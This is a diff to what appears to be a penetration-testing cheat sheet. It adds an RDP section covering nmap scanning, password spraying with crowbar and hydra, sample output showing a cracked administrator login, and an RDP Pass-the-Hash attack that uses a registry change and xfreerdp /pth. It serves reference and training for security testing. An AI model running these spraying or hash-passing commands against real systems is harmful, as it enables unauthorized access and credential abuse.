@@ -1626,7 +1626,7 @@ sqsh -S <TARGET_IP> -U .\\<USER> -P '<PASSWORD>' -h
 **OPTION 2: `mssqlclient.py`**
 
 ```bash
-mssqlclient.py -p <PORT> <USER>@<TARGET_IP>
+python3 /usr/local/bin/mssqlclient.py -p <PORT> <USER>@<TARGET_IP>
 ```
 
 </details>
@@ -1646,6 +1646,11 @@ GO
 # model
 # msdb
 # users
+```
+**Only show databases you truly have access**
+
+```bash
+SELECT name FROM sys.databases WHERE HAS_DBACCESS(name)=1 ORDER BY name;
 ```
 
 **Use a Database**
@@ -2003,7 +2008,143 @@ As **sysadmin**, we control the SQL Server instance. We can read data from any d
 <details>
 <summary><h1>🖧 RDP</h1></summary>
 
+Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft that provides a user with a graphical interface to connect to another computer over a network connection. It is one of the most popular administration tools, allowing centralized control of remote systems with the same functionality as if they were on-site.
 
+* **Default Port: TCP/3389**
+
+RDP is widely used because it enables:
+* Full graphical control of remote Windows systems
+* Centralized administration of distributed IT infrastructure
+* Managed Service Providers (MSPs) to support many client networks from a single location
+
+Unfortunately, while RDP greatly facilitates remote administration, it also creates a significant gateway for attacks. It is a prime target for attackers because:
+* It provides direct, graphical access to a target system.
+* It is often exposed to the internet for convenience.
+* Compromising an RDP connection can bypass many other security controls.
+
+**Security Risks**
+
+If an attacker gains access to an RDP port, they may be able to:
+* Launch brute-force or password-spraying attacks to steal user credentials
+* Exploit vulnerabilities in the RDP service itself (e.g., BlueKeep)
+* Move laterally through a network after compromising a single machine
+* Escalate privileges, especially if an administrator account is compromised
+
+<details>
+<summary><h2>Nmap scan</h2></summary>
+
+```bash
+sudo nmap -Pn -p3389 <TARGET_IP>
+```
+```bash
+# Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
+# Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
+# Nmap scan report for <TARGET_IP>
+# Host is up (0.00037s latency).
+
+# PORT     STATE    SERVICE
+# 3389/tcp open ms-wbt-server
+```
+
+| Flag            | Purpose                                         |
+|-----------------|-------------------------------------------------|
+| `-Pn`           | Treat host as online (skip ICMP ping discovery) |
+| `-p3389`        | Scan only port 3389 (RDP default)               |
+| `<TARGET_IP>`   | Target IP address                               |
+
+</details>
+
+<details>
+<summary><h2>Misconfigurations</h2></summary>
+
+Since RDP relies on user credentials for authentication, a common attack vector is password guessing. While rare, misconfigurations can even result in an RDP service with no password set.
+
+> **NOTE:** A critical consideration when attacking Windows authentication is the account lockout policy. To avoid locking out accounts, a technique called Password Spraying is used. This involves trying one common password against a list of usernames before moving on to the next password.
+
+**Example Attack: Password Spraying**
+
+**Step 1: Create a User List**
+
+```bash
+cat usernames.txt
+```
+```bash
+# root
+# test
+# user
+# guest
+# admin
+# administrator
+```
+
+**Step 2: Execute the Password Spray**
+
+**Option 1: Crowbar**
+
+```bash
+crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+```
+```bash
+# 2022-04-07 15:35:50 START
+# 2022-04-07 15:35:50 Crowbar v0.4.1
+# 2022-04-07 15:35:50 Trying 192.168.220.142:3389
+# 2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
+# 2022-04-07 15:35:52 STOP
+```
+
+**Option 2: Hydra**
+
+```bash
+hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+```
+```bash
+# Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+# ...
+
+# [DATA] attacking rdp://192.168.2.147:3389/
+# [3389][rdp] host: 192.168.2.143   login: administrator   password: password123
+# 1 of 1 target successfully completed, 1 valid password found
+```
+
+**Step 3: RDP Login with valid credentials**
+
+```bash
+rdesktop -u administrator -p password123 192.168.2.143
+```
+
+</details>
+
+<details>
+<summary><h2>RDP Pass-the-Hash (PtH)</h2></summary>
+
+During a penetration test, we often need GUI access to leverage specific applications on a Windows target. While plaintext credentials make this easy via RDP, we frequently only have the user's **NT hash** (e.g., dumped from the SAM database or LSASS memory). If the hash is un-crackable, we can attempt an **RDP Pass-the-Hash (PtH)** attack to gain graphical access without needing the plaintext password.
+
+This attack requires **Restricted Admin Mode**, which is disabled by default on modern Windows systems. It must be enabled on the target host via the registry.
+
+**Registry Key to Modify:**
+```cmd
+HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
+```
+
+**Value Name:** DisableRestrictedAdmin
+**Type:** REG_DWORD
+**Value Data:** 0 (enables PtH)
+
+**Step 1: Add the DisableRestrictedAdmin Registry Key**
+
+```cmd
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+**Step 2: Use xfreerdp with the option /pth**
+
+```bash
+xfreerdp /v:<TARGET_IP> /u:<USER> /pth:<HASH>
+```
+
+
+</details>
 
 </details>
 
